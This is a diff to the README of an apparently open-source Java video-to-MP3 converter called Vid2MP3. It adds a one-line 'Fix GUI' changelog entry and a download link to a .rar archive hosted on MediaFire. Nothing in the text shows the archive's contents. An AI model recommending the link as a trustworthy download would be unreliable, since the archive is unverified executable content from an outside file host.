@@ -35,3 +35,11 @@ I'm excited to hear your feedback, suggestions, and experiences with Vid2MP3. Fe
 Thank you for choosing Vid2MP3 and joining me on this programming and music adventure!
 
 \#Vid2MP3 #JavaProject #NoAds
+
+## Changelog
+
+- Fix GUI
+
+## Download
+
+https://www.mediafire.com/file/818jovmzr5rnh0g/Vid2MP3.rar/file
